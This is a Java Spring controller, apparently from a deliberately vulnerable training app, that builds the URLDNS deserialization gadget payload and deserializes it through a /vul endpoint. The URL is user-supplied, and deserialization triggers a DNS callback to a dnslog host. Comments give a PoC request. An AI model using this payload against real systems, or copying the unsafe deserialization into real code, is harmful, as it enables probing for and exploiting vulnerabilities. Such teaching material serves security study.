package com.madaha.codesecone.controller.AdvancedAttack.deserialize.urldnsDeserialize;

import org.apache.bcel.generic.INEG;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

/**
 * 特点：最简单的一个利用链，并且没有JDK版本的限制。通常用于测试反序列化漏洞是否存在。
 *
 *    1. 不限制jdk版本，使用Java内置类，对第三方依赖没有要求
 *    2. 目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞
 *    3. URLDNS利用链，只能发起DNS请求，并不能进行其他利用
 */
@RestController
@RequestMapping("/URLDNS")
public class URLDNS {

    private static String urlDefault = "http://xxx.dnslog.cn";

    /**
     * 注：这里测试是否能够反序列化弹出dns，确认完全没有限制。
     *
     * @poc http://127.0.0.1:28888/URLDNS/vul?url=http://123456.baidu.com
     * @payload url=http://123456.dnslog.cn
     *
     * @param url
     * @return str
     * @throws Exception
     */
    @RequestMapping("/vul")
    public String vul(String url) throws Exception {
        // 设置恶意url地址，并生成恶意序列化数据
        if (url != null){
            this.urlDefault = url;
        }
        vulCreat();

        // 反序列化漏洞测试，执行反序列化。
        try {
            FileInputStream fileInputStream = new FileInputStream("./urldns.ser");
            ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);
            inputStream.readObject();
            inputStream.close();
            fileInputStream.close();

            return "success";
        }catch (Exception e){
            e.printStackTrace();
            return "error";
        }
    }

    // 生成恶意序列化数据
    public static void vulCreat() throws Exception{
        HashMap map = new HashMap();
        URL url = new URL(urlDefault);

        Field field = Class.forName("java.net.URL").getDeclaredField("hashCode");
        field.setAccessible(true);      // 通过反射，绕过Java语言权限控制检查的 权限。
        field.set(url, 123);            // 设置hashCode的值为-1的其他任何数字
        System.out.println(url.hashCode());

        map.put(url, 123);              // 调用HashMap对象中的put方法，此时因为hashcode != -1 ，不在触发dns查询
        field.set(url, -1);             // 将hashCode重新设置为-1，确保在反序列化成功触发！

        try {
            FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser");
            ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);

            outputStream.writeObject(map);
            outputStream.close();
            fileOutputStream.close();
        }catch (Exception e){
            e.printStackTrace();
        }
    }


    // 测试使用
    public static void main(String[] args) throws Exception {
        HashMap map = new HashMap();
        URL url = new URL(urlDefault);

        Field field = Class.forName("java.net.URL").getDeclaredField("hashCode");
        field.setAccessible(true);      // 通过反射，绕过Java语言权限控制检查的 权限。
        field.set(url, 123);            // 设置hashCode的值为-1的其他任何数字
        System.out.println(url.hashCode());

        map.put(url, 123);              // 调用HashMap对象中的put方法，此时因为hashcode != -1 ，不在触发dns查询
        field.set(url, -1);             // 将hashCode重新设置为-1，确保在反序列化成功触发！

        try {
            FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser");
            ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);

            outputStream.writeObject(map);
            outputStream.close();
            fileOutputStream.close();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
